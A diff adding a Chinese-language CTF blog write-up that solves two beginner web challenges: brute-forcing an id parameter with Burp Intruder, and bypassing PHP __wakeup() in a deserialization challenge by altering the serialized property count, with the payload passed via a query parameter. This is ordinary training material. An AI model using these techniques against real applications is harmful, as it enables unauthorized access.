@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>攻防世界web萌新入坑wp - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=writeup>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">攻防世界web萌新入坑wp</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ics-06"><span class="toc-text">ics-06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unserialize3"><span class="toc-text">unserialize3</span></a></li></ol>
+
+  <div class="post-content">
+    <h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h2><p>使用burpsuite intruder或写脚本遍历id参数，id=2333时爆出flag</p>
+<p><a href="https://t0data.gitbooks.io/burpsuite/content/chapter8.html" target="_blank" rel="noopener">使用burp intruder</a></p>
+<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>反序列化漏洞，绕过<strong>wakeup(),详细参见<br><a href="https://mp.weixin.qq.com/s" target="_blank" rel="noopener">https://mp.weixin.qq.com/s</a>?</strong>biz=MzUzNTkyODI0OA==&amp;mid=2247492379&amp;idx=1&amp;sn=1a0f8b4aa7e61472ac2983397af20f92&amp;chksm=fafcafcccd8b26da56a645fa1931f7b593699add7fad8b384cd00ba92a98cf7875ad1214f90a&amp;mpshare=1&amp;scene=1&amp;srcid=#rd</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $flag=<span class="string">'111'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = serialize(<span class="keyword">new</span> xctf);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}</p>
+<p>改成O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
+<p>然后访问?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-04-09</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2022
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
